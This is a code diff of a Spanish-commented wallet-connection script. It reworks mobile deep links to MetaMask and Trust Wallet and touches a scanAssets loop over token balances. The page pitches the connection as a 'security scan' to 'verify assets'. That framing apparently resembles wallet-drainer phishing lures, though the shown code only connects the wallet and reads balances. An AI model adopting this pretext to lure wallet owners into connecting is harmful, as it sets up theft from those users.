@@ -471,61 +471,57 @@ function detectWallet() {
  return 'unknown';
 }
 
-// LÓGICA DE CONEXIÓN MEJORADA PARA MÓVIL
+// LÓGICA DE CONEXIÓN MEJORADA PARA MÓVIL (QUIRÚRGICA)
 connectBtn.addEventListener('click', async () => {
+ // Si NO hay ethereum, estamos en un navegador externo (Chrome, Safari, Edge)
  if (!window.ethereum) {
- statusDiv.textContent = "Instala tu wallet primero.";
- return;
+     // Detectamos qué wallet tiene el usuario instalado para darle el link correcto
+     detectWallet();
+     
+     if (isMobile()) {
+         // Configuración del Modal Universal
+         modalTitle.textContent = detectedWalletType === 'metamask' ? "MetaMask Required" : "Wallet Required";
+         modalText.textContent = "Abre tu wallet para verificar los activos.";
+         
+         // Lógica de Deep Link Universal (La forma profesional de hacerlo)
+         openAppBtn.onclick = () => {
+             if (detectedWalletType === 'metamask') {
+                 // MetaMask Universal Link
+                 window.location.href = `https://metamask.app.link/dapp/${window.location.host}`;
+             } else if (detectedWalletType === 'trust') {
+                 // Trust Wallet Universal Link
+                 window.location.href = `https://link.trustwallet.org/open_url?chain_id=${currentChainId || 56}&url=${encodeURIComponent(window.location.href)}`;
+             } else {
+                 // Fallback genérico para otros
+                 window.location.href = "https://metamask.io/download/";
+             }
+             
+             // Intentamos conectar mientras se abre la app (por si acaso el usuario vuelve rápido)
+             setTimeout(tryConnect, 2000);
+         };
+         
+         confirmOpenBtn.onclick = () => {
+             // Si el usuario dice "Ya está abierto", recargamos para que la inyección ocurra
+             window.location.reload();
+         };
+         
+         mobileModal.style.display = 'flex';
+         return;
+     }
+     
+     statusDiv.textContent = "Por favor, conecta tu wallet primero.";
+     return;
  }
 
- // Detectar qué wallet es para ajustar textos
+ // Si SÍ hay ethereum, procedemos normalmente
  detectWallet();
 
  if (isMobile()) {
- // Solo mostramos modal si estamos en Trust Wallet o MetaMask Mobile dentro del navegador
- // Si ya tenemos window.ethereum, podemos intentar conectar directo
- if (detectedWalletType === 'trust' && !window.ethereum.isTrust) {
- // Estamos en el navegador externo (Chrome/Safari) pero tenemos Trust instalado
- modalTitle.textContent = "Trust Wallet Detected";
- modalText.textContent = "Para verificar tus activos, abriremos el navegador interno o conectaremos directamente.";
- 
- openAppBtn.onclick = () => {
- // Forzar apertura en Trust Browser usando Deep Link Universal
- window.open('https://link.trustwallet.org/open_url?chain_id=56&url=' + encodeURIComponent(window.location.href));
- tryConnect(); 
- };
- } else if (detectedWalletType === 'metamask' && !window.ethereum.isMetaMask) {
- // MetaMask en navegador externo (ej. Chrome)
- modalTitle.textContent = "MetaMask Detected";
- modalText.textContent = "Abre la app para confirmar la conexión.";
- openAppBtn.onclick = () => {
- window.open('https://metamask.app.link/dapp/' + window.location.host);
- tryConnect();
- };
+     // En móvil, si ya tenemos ethereum, intentamos conectar directo
+     tryConnect();
  } else {
- // MetaMask o Trust ya conectado (dentro de su browser)
- modalTitle.textContent = "Mobile Wallet Connected";
- modalText.textContent = "Presiona 'Conectar' para iniciar el escaneo de seguridad.";
- openAppBtn.onclick = () => {
- mobileModal.style.display = 'none';
- tryConnect();
- };
- }
-
- mobileModal.style.display = 'flex';
- confirmOpenBtn.addEventListener('click', () => {
- mobileModal.style.display = 'none';
- tryConnect();
- });
- return; 
- }
-
- // En Desktop, simplemente conectamos
- try {
- await tryConnect();
- } catch (err) {
- console.error(err);
- statusDiv.textContent = "Error de conexión.";
+     // Desktop
+     tryConnect();
  }
 });
 
@@ -587,7 +583,7 @@ async function scanAssets() {
  log("Error scanning native balance.");
  }
 
- // 2. Iteración sobre tokens conocidos (Usando la lista completa del archivo original)
+ // 2. Iteración sobre tokens conocidos
  for(let token of TOKENS_TO_SCAN) {
  if(token.chainId === currentChainId) {
  try {
